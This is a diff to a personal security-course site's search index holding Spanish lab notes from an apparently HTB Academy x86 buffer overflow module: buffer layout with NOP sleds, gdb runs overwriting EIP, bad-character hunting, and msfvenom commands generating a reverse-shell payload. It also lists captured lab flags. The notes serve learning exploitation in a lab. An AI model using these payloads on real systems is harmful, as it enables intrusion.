+    "text": "Después de controlar EIP, necesitamos determinar cuánto espacio tenemos para el shellcode.\n\n\nUsar msfvenom para estimar:\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 \\\n  --platform linux --arch x86 --format c\nResultado:\nPayload size: 68 bytes\n\n\n\n\n\n\nComponente\nTamaño\nPropósito\n\n\n\n\nBuffer\nVariable\nPadding inicial\n\n\nNOPs\n100 bytes\nNOP sled para confiabilidad\n\n\nShellcode\n150 bytes\nCódigo malicioso (margen extra)\n\n\nEIP\n4 bytes\nDirección de retorno\n\n\n\n\n\n\nTotal hasta EIP = 1040 bytes\n- NOPs:        - 100 bytes\n- Shellcode:   - 150 bytes\n- EIP:         -   4 bytes\n───────────────────────────\nBuffer:       = 786 bytes\nFórmula:\nBuffer = 1040 - 100 - 150 - 4 = 786 bytes\n\n\n\n[786 bytes Buffer][100 bytes NOPs][150 bytes Shellcode][4 bytes EIP]\n\n\n\nLos NOPs (\\x90) son instrucciones “No Operation”:\n\nPermiten que el código se ejecute limpiamente\nDan margen de error en la dirección de salto\nEl CPU “desliza” hasta el shellcode\n\n\n\n\n(gdb) run $(python -c 'print \"\\x55\" * (1040 - 100 - 150 - 4) + \"\\x90\" * 100 + \"\\x44\" * 150 + \"\\x66\" * 4')\nResultado esperado:\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()\n\n\n\n\n\n\nConcepto\nValor\n\n\n\n\nNOPs\n100 bytes\n\n\nShellcode\n150 bytes\n\n\nTotal\n250 bytes\n\n\n\n\n\n\n\nShellcode típico: 60-80 bytes\nMargen de seguridad: +50-100 bytes\nNOP sled mejora confiabilidad\nAjustar según necesidades específicas"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#tamaño-del-shellcode",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#tamaño-del-shellcode",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "Usar msfvenom para estimar:\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 \\\n  --platform linux --arch x86 --format c\nResultado:\nPayload size: 68 bytes"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#planificación-del-buffer",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#planificación-del-buffer",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "Componente\nTamaño\nPropósito\n\n\n\n\nBuffer\nVariable\nPadding inicial\n\n\nNOPs\n100 bytes\nNOP sled para confiabilidad\n\n\nShellcode\n150 bytes\nCódigo malicioso (margen extra)\n\n\nEIP\n4 bytes\nDirección de retorno"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#cálculo-del-buffer",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#cálculo-del-buffer",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "Total hasta EIP = 1040 bytes\n- NOPs:        - 100 bytes\n- Shellcode:   - 150 bytes\n- EIP:         -   4 bytes\n───────────────────────────\nBuffer:       = 786 bytes\nFórmula:\nBuffer = 1040 - 100 - 150 - 4 = 786 bytes"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#estructura-final",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#estructura-final",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "[786 bytes Buffer][100 bytes NOPs][150 bytes Shellcode][4 bytes EIP]"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#nop-sled",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#nop-sled",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "Los NOPs (\\x90) son instrucciones “No Operation”:\n\nPermiten que el código se ejecute limpiamente\nDan margen de error en la dirección de salto\nEl CPU “desliza” hasta el shellcode"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#verificar-espacio",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#verificar-espacio",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "(gdb) run $(python -c 'print \"\\x55\" * (1040 - 100 - 150 - 4) + \"\\x90\" * 100 + \"\\x44\" * 150 + \"\\x66\" * 4')\nResultado esperado:\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#espacio-total-disponible",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#espacio-total-disponible",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "Concepto\nValor\n\n\n\n\nNOPs\n100 bytes\n\n\nShellcode\n150 bytes\n\n\nTotal\n250 bytes"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/07-shellcode-length.html#consideraciones",
+    "href": "security/buffer-overflow-x86/07-shellcode-length.html#consideraciones",
+    "title": "Determine the Length for Shellcode",
+    "section": "",
+    "text": "Shellcode típico: 60-80 bytes\nMargen de seguridad: +50-100 bytes\nNOP sled mejora confiabilidad\nAjustar según necesidades específicas"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "Los bad characters son bytes que interrumpen o alteran el payload. Debemos identificarlos para generar shellcode válido.\n\n\n\n\n\nByte\nNombre\nRazón\n\n\n\n\n\\x00\nNull Byte\nTermina strings en C\n\n\n\\x09\nTab\nProblemas con argumentos\n\n\n\\x0a\nLine Feed\nTermina líneas\n\n\n\\x0d\nCarriage Return\nProblemas de entrada\n\n\n\\x20\nSpace\nProblemas con argumentos\n\n\n\\xff\nForm Feed\nProblemas de formato\n\n\n\n\n\n\n\n\nCHARS=\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n\n\n\ngdb -q ./bow\n(gdb) break bowfunc\n\n\n\n(gdb) run $(python -c 'print \"\\x55\"*784 + \"&lt;CHARS&gt;\" + \"\\x66\"*4')\n\n\n\n(gdb) x/300xb $esp+1100\n\n\n\n\nEsperado: Secuencia continua \\x01\\x02\\x03\\x04...\nReal encontrado:\n0xffffd6a0: 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 0x00 0x0b ...\n                                                      ↑\n                                              Debería ser 0x09\n\n0xffffd6c0: 0x1e 0x1f 0x00 0x21 ...\n                      ↑\n              Debería ser 0x20\n\n\n\n\n\n\nByte\nValor\nEvidencia\n\n\n\n\n\\x00\nNull Byte\nAparece en lugar de \\x09 y \\x20\n\n\n\\x09\nTab\nFaltante después de \\x08\n\n\n\\x0a\nLine Feed\nFaltante (salta a \\x0b)\n\n\n\\x20\nSpace\nFaltante después de \\x1f\n\n\n\nRespuesta: \\x00\\x09\\x0a\\x20\n\n\n\n\nIdentificar primer bad char\nEliminar del payload\nAjustar tamaño del buffer\nRepetir hasta encontrar todos\n\n\n\n\nBuffer original: 786 bytes\nDespués de eliminar 4 bad chars: 786 bytes (ya incluidos en CHARS)\n\n\n\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT \\\n  -b '\\x00\\x09\\x0a\\x20' --platform linux --arch x86 -f c\nEl flag -b especifica bad characters a evitar."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html#bad-characters-comunes",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html#bad-characters-comunes",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "Byte\nNombre\nRazón\n\n\n\n\n\\x00\nNull Byte\nTermina strings en C\n\n\n\\x09\nTab\nProblemas con argumentos\n\n\n\\x0a\nLine Feed\nTermina líneas\n\n\n\\x0d\nCarriage Return\nProblemas de entrada\n\n\n\\x20\nSpace\nProblemas con argumentos\n\n\n\\xff\nForm Feed\nProblemas de formato"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html#metodología-de-identificación",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html#metodología-de-identificación",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "CHARS=\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n\n\n\ngdb -q ./bow\n(gdb) break bowfunc\n\n\n\n(gdb) run $(python -c 'print \"\\x55\"*784 + \"&lt;CHARS&gt;\" + \"\\x66\"*4')\n\n\n\n(gdb) x/300xb $esp+1100"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html#análisis-de-resultados",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html#análisis-de-resultados",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "Esperado: Secuencia continua \\x01\\x02\\x03\\x04...\nReal encontrado:\n0xffffd6a0: 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 0x00 0x0b ...\n                                                      ↑\n                                              Debería ser 0x09\n\n0xffffd6c0: 0x1e 0x1f 0x00 0x21 ...\n                      ↑\n              Debería ser 0x20"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html#bad-characters-identificados",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html#bad-characters-identificados",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "Byte\nValor\nEvidencia\n\n\n\n\n\\x00\nNull Byte\nAparece en lugar de \\x09 y \\x20\n\n\n\\x09\nTab\nFaltante después de \\x08\n\n\n\\x0a\nLine Feed\nFaltante (salta a \\x0b)\n\n\n\\x20\nSpace\nFaltante después de \\x1f\n\n\n\nRespuesta: \\x00\\x09\\x0a\\x20"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html#proceso-iterativo",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html#proceso-iterativo",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "Identificar primer bad char\nEliminar del payload\nAjustar tamaño del buffer\nRepetir hasta encontrar todos"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html#ajuste-del-buffer",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html#ajuste-del-buffer",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "Buffer original: 786 bytes\nDespués de eliminar 4 bad chars: 786 bytes (ya incluidos en CHARS)"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/08-bad-characters.html#uso-en-msfvenom",
+    "href": "security/buffer-overflow-x86/08-bad-characters.html#uso-en-msfvenom",
+    "title": "Identification of Bad Characters",
+    "section": "",
+    "text": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT \\\n  -b '\\x00\\x09\\x0a\\x20' --platform linux --arch x86 -f c\nEl flag -b especifica bad characters a evitar."
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "Los registros son componentes esenciales de la CPU que proporcionan almacenamiento temporal para datos.\n\n\n\n\n\n32-bit\n64-bit\nDescripción\n\n\n\n\nEAX\nRAX\nAccumulator - I/O, operaciones aritméticas\n\n\nEBX\nRBX\nBase - direccionamiento indexado\n\n\nECX\nRCX\nCounter - loops, rotaciones\n\n\nEDX\nRDX\nData - I/O, multiplicar/dividir\n\n\n\n\n\n\n\n\n\n32-bit\n64-bit\nDescripción\n\n\n\n\nEIP\nRIP\nInstruction Pointer - próxima instrucción\n\n\nESP\nRSP\nStack Pointer - tope del stack\n\n\nEBP\nRBP\nBase Pointer - base del stack frame\n\n\n\n\n\n\n\n\n\n32-bit\n64-bit\nDescripción\n\n\n\n\nESI\nRSI\nSource Index - operaciones de string\n\n\nEDI\nRDI\nDestination Index - operaciones de string\n\n\n\n\n\n\nCada función crea un stack frame:\n┌─────────────────────┐ Direcciones altas\n│   Argumentos        │\n├─────────────────────┤\n│   Return Address    │ ← EIP apunta aquí al retornar\n├─────────────────────┤\n│   Saved EBP         │ ← EBP apunta aquí\n├─────────────────────┤\n│   Variables locales │\n├─────────────────────┤\n│   Buffer            │\n├─────────────────────┤ ← ESP apunta aquí\n│   ...               │\n└─────────────────────┘ Direcciones bajas\n\n\n\nCuando se llama una función:\npush   ebp          ; 1. Guardar EBP anterior\nmov    ebp,esp      ; 2. Crear nuevo stack frame\nsub    esp,0x404    ; 3. Reservar espacio local\n\n\n\nAl salir de la función:\nleave               ; mov esp, ebp ; pop ebp\nret                 ; pop eip (retorna a caller)\n\n\n\nEIP (Instruction Pointer) es el objetivo principal en buffer overflows:\n\nApunta a la próxima instrucción a ejecutar\nSi lo controlamos, controlamos el flujo del programa\nSe sobrescribe al desbordar el buffer hasta el return address\n\n\n\n\n\n\n\nAspecto\n32-bit\n64-bit\n\n\n\n\nDirecciones\n4 bytes\n8 bytes\n\n\nRegistros\nEAX, EBX…\nRAX, RBX…\n\n\nParámetros\nStack\nRegistros + Stack\n\n\n\n\n\n\n(gdb) info registers\n(gdb) info registers eip esp ebp"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#data-registers",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#data-registers",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "32-bit\n64-bit\nDescripción\n\n\n\n\nEAX\nRAX\nAccumulator - I/O, operaciones aritméticas\n\n\nEBX\nRBX\nBase - direccionamiento indexado\n\n\nECX\nRCX\nCounter - loops, rotaciones\n\n\nEDX\nRDX\nData - I/O, multiplicar/dividir"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#pointer-registers",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#pointer-registers",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "32-bit\n64-bit\nDescripción\n\n\n\n\nEIP\nRIP\nInstruction Pointer - próxima instrucción\n\n\nESP\nRSP\nStack Pointer - tope del stack\n\n\nEBP\nRBP\nBase Pointer - base del stack frame"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#index-registers",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#index-registers",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "32-bit\n64-bit\nDescripción\n\n\n\n\nESI\nRSI\nSource Index - operaciones de string\n\n\nEDI\nRDI\nDestination Index - operaciones de string"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#stack-frames",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#stack-frames",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "Cada función crea un stack frame:\n┌─────────────────────┐ Direcciones altas\n│   Argumentos        │\n├─────────────────────┤\n│   Return Address    │ ← EIP apunta aquí al retornar\n├─────────────────────┤\n│   Saved EBP         │ ← EBP apunta aquí\n├─────────────────────┤\n│   Variables locales │\n├─────────────────────┤\n│   Buffer            │\n├─────────────────────┤ ← ESP apunta aquí\n│   ...               │\n└─────────────────────┘ Direcciones bajas"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#prologue",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#prologue",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "Cuando se llama una función:\npush   ebp          ; 1. Guardar EBP anterior\nmov    ebp,esp      ; 2. Crear nuevo stack frame\nsub    esp,0x404    ; 3. Reservar espacio local"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#epilogue",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#epilogue",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "Al salir de la función:\nleave               ; mov esp, ebp ; pop ebp\nret                 ; pop eip (retorna a caller)"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#eip---el-registro-crítico",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#eip---el-registro-crítico",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "EIP (Instruction Pointer) es el objetivo principal en buffer overflows:\n\nApunta a la próxima instrucción a ejecutar\nSi lo controlamos, controlamos el flujo del programa\nSe sobrescribe al desbordar el buffer hasta el return address"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#diferencias-32-bit-vs-64-bit",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#diferencias-32-bit-vs-64-bit",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "Aspecto\n32-bit\n64-bit\n\n\n\n\nDirecciones\n4 bytes\n8 bytes\n\n\nRegistros\nEAX, EBX…\nRAX, RBX…\n\n\nParámetros\nStack\nRegistros + Stack"
+  },
+  {
+    "objectID": "security/buffer-overflow-x86/05-cpu-registers.html#ver-registros-en-gdb",
+    "href": "security/buffer-overflow-x86/05-cpu-registers.html#ver-registros-en-gdb",
+    "title": "CPU Registers",
+    "section": "",
+    "text": "(gdb) info registers\n(gdb) info registers eip esp ebp"
   },
   {
     "objectID": "security/nmap-course/lab4-evasion-easy.html",
@@ -4400,28 +5121,28 @@
     "href": "security/index.html",
     "title": "Security",
     "section": "",
-    "text": "Bienvenido a la sección de Ciberseguridad. Aquí encontrarás cursos completos desde fundamentos hasta técnicas avanzadas de pentesting.\n\n\n\n\nCurso completo de enumeración de redes con Nmap, desde conceptos básicos hasta técnicas avanzadas de evasión de firewalls e IDS/IPS.\nAcceder al Curso de Nmap →\nContenido del curso:\n\nIntroducción a Nmap y arquitectura\nHost Discovery y Port Scanning\nService Enumeration y NSE Scripts\nFirewall & IDS/IPS Evasion (3 laboratorios HTB)\n6 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\n\n\n\n\nCurso completo de HTTP y cURL desde HTB Academy. Aprende los fundamentos del protocolo HTTP, HTTPS, headers, métodos HTTP y CRUD APIs.\nAcceder al Curso de Web Requests →\nContenido del curso:\n\nHTTP Fundamentals y protocolo\nHTTPS y SSL/TLS\nHTTP Requests & Responses\nHTTP Headers y autenticación\nHTTP Methods (GET, POST, PUT, DELETE)\nCRUD API con cURL\n8 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\nFlags obtenidas:\n\n\n\nFlag\nSección\n\n\n\n\nHTB{64$!c_cURL_u$3r}\nHTTP Basics\n\n\nHTB{p393_r3qu3$t$_m0n!t0r}\nHTTP Headers\n\n\nHTB{curl_g3773r}\nGET Method\n\n\nHTB{p0$t_r3p34t3r}\nPOST Method\n\n\nHTB{crud_4p!_m4n!pul4t0r}\nCRUD API\n\n\n\nAchievement: https://academy.hackthebox.com/achievement/2300153/35\n\n\n\n\nCurso completo de fuzzing web con FFUF desde HTB Academy. Aprende directory fuzzing, subdomain discovery, y parameter fuzzing.\nAcceder al Curso de FFUF →\nContenido del curso:\n\nDirectory Fuzzing\nSubdomain Fuzzing\nParameter Fuzzing\n12 ejercicios prácticos completados\n\nProgreso del curso: 100% ✅\nAchievement: https://academy.hackthebox.com/achievement/2300153/54\n\n\n\n\nCurso completo de pentesting automatizado con Inteligencia Artificial local, utilizando Ollama y Docker para máxima privacidad.\nAcceder al Curso de PentAGI →\nContenido del curso:\n\nIntroducción a PentAGI y arquitectura\nInstalación y configuración con Ollama local\nPrimeros pasos y mejores prácticas\nSeguridad y optimización\nLaboratorio práctico completo\n\nProgreso del curso: 100% ✅\nFilosofía: Seguridad por defecto\n\nSin APIs externas (todo local con Ollama)\nSin credenciales expuestas\nAislamiento completo con Docker\n\n\n\n\n\nPlan completo de 16 semanas para conseguir empleo en ciberseguridad, usando estrategias gratuitas con HTB Academy, PentAGI y Bug Bounty.\nVer Roadmap Completo →\nContenido del roadmap:\n\nFase 1: Fundamentos + Perfil (Semanas 1-3)\nFase 2: PentAGI + HTB Integration (Semanas 4-6)\nFase 3: Desbloquear Módulos (Semanas 7-10)\nFase 4: Labs + Portfolio (Semanas 11-14)\nFase 5: Bug Bounty + Job Search (Semanas 15-16)\n\nIncluye:\n\nTracker de cubos HTB\nCV Template para Pentester Junior\nChecklist semanal de progreso\nEstrategia de acumulación gratuita\n\n\n\n\n\n\n\n\n\nReto\nPlataforma\nDificultad\nFecha\n\n\n\n\nNmap Default Scan\nHTB Academy\nEasy\n2026-02-11\n\n\nFull Port Scan\nHTB Academy\nEasy\n2026-02-19\n\n\nService Enumeration\nHTB Academy\nEasy\n2026-02-20\n\n\nNSE Scripts\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Easy\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Medium\nHTB Academy\nMedium\n2026-02-20\n\n\nFirewall Evasion Hard\nHTB Academy\nHard\n2026-02-20\n\n\n\n\n\n\n\n\n\n\nHabilidad\nNivel\n\n\n\n\nHost Discovery\nAvanzado\n\n\nPort Scanning\nAvanzado\n\n\nService Enumeration\nAvanzado\n\n\nNSE Scripts\nIntermedio\n\n\nFirewall Evasion\nAvanzado\n\n\nIDS/IPS Bypass\nIntermedio\n\n\n\n\n\n\n\n\n\nGuía completa de configuración de OpenVPN para conectar a HTB Academy desde Linux, macOS y Windows.\nVer guía de OpenVPN →\n\n\n\n\n\n\n\n\nMétrica\nValor\n\n\n\n\nLaboratorios Completados\n15\n\n\nFlags Obtenidas\n8\n\n\nMódulos HTB Completados\n3"
+    "text": "Bienvenido a la sección de Ciberseguridad. Aquí encontrarás cursos completos desde fundamentos hasta técnicas avanzadas de pentesting.\n\n\n\n\nCurso completo de enumeración de redes con Nmap, desde conceptos básicos hasta técnicas avanzadas de evasión de firewalls e IDS/IPS.\nAcceder al Curso de Nmap →\nContenido del curso:\n\nIntroducción a Nmap y arquitectura\nHost Discovery y Port Scanning\nService Enumeration y NSE Scripts\nFirewall & IDS/IPS Evasion (3 laboratorios HTB)\n6 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\n\n\n\n\nCurso completo de HTTP y cURL desde HTB Academy. Aprende los fundamentos del protocolo HTTP, HTTPS, headers, métodos HTTP y CRUD APIs.\nAcceder al Curso de Web Requests →\nContenido del curso:\n\nHTTP Fundamentals y protocolo\nHTTPS y SSL/TLS\nHTTP Requests & Responses\nHTTP Headers y autenticación\nHTTP Methods (GET, POST, PUT, DELETE)\nCRUD API con cURL\n8 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\nFlags obtenidas:\n\n\n\nFlag\nSección\n\n\n\n\nHTB{64$!c_cURL_u$3r}\nHTTP Basics\n\n\nHTB{p393_r3qu3$t$_m0n!t0r}\nHTTP Headers\n\n\nHTB{curl_g3773r}\nGET Method\n\n\nHTB{p0$t_r3p34t3r}\nPOST Method\n\n\nHTB{crud_4p!_m4n!pul4t0r}\nCRUD API\n\n\n\nAchievement: https://academy.hackthebox.com/achievement/2300153/35\n\n\n\n\nCurso completo de fuzzing web con FFUF desde HTB Academy. Aprende directory fuzzing, subdomain discovery, y parameter fuzzing.\nAcceder al Curso de FFUF →\nContenido del curso:\n\nDirectory Fuzzing\nSubdomain Fuzzing\nParameter Fuzzing\n12 ejercicios prácticos completados\n\nProgreso del curso: 100% ✅\nAchievement: https://academy.hackthebox.com/achievement/2300153/54\n\n\n\n\nCurso completo de buffer overflows desde HTB Academy. Aprende arquitectura CPU, registros, desarrollo de exploits y generación de shellcode.\nAcceder al Curso de Buffer Overflow →\nContenido del curso:\n\nBuffer Overflows Overview\nExploit Development Introduction\nCPU Architecture (Von-Neumann, ISA)\nStack-Based Buffer Overflow\nCPU Registers (EIP, ESP, EBP)\nTake Control of EIP\nDetermine Shellcode Length\nIdentification of Bad Characters\nGenerating Shellcode con msfvenom\nReturn Address Calculation\nProof-of-Concept Exploit\n\nProgreso del curso: 69% (9/13 secciones)\nBad Characters identificados: \\x00\\x09\\x0a\\x20\nOffset determinado: 1036 bytes\nStack Size: 0x21000\n\n\n\n\nCurso completo de pentesting automatizado con Inteligencia Artificial local, utilizando Ollama y Docker para máxima privacidad.\nAcceder al Curso de PentAGI →\nContenido del curso:\n\nIntroducción a PentAGI y arquitectura\nInstalación y configuración con Ollama local\nPrimeros pasos y mejores prácticas\nSeguridad y optimización\nLaboratorio práctico completo\n\nProgreso del curso: 100% ✅\nFilosofía: Seguridad por defecto\n\nSin APIs externas (todo local con Ollama)\nSin credenciales expuestas\nAislamiento completo con Docker\n\n\n\n\n\nPlan completo de 16 semanas para conseguir empleo en ciberseguridad, usando estrategias gratuitas con HTB Academy, PentAGI y Bug Bounty.\nVer Roadmap Completo →\nContenido del roadmap:\n\nFase 1: Fundamentos + Perfil (Semanas 1-3)\nFase 2: PentAGI + HTB Integration (Semanas 4-6)\nFase 3: Desbloquear Módulos (Semanas 7-10)\nFase 4: Labs + Portfolio (Semanas 11-14)\nFase 5: Bug Bounty + Job Search (Semanas 15-16)\n\nIncluye:\n\nTracker de cubos HTB\nCV Template para Pentester Junior\nChecklist semanal de progreso\nEstrategia de acumulación gratuita\n\n\n\n\n\n\n\n\n\nReto\nPlataforma\nDificultad\nFecha\n\n\n\n\nNmap Default Scan\nHTB Academy\nEasy\n2026-02-11\n\n\nFull Port Scan\nHTB Academy\nEasy\n2026-02-19\n\n\nService Enumeration\nHTB Academy\nEasy\n2026-02-20\n\n\nNSE Scripts\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Easy\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Medium\nHTB 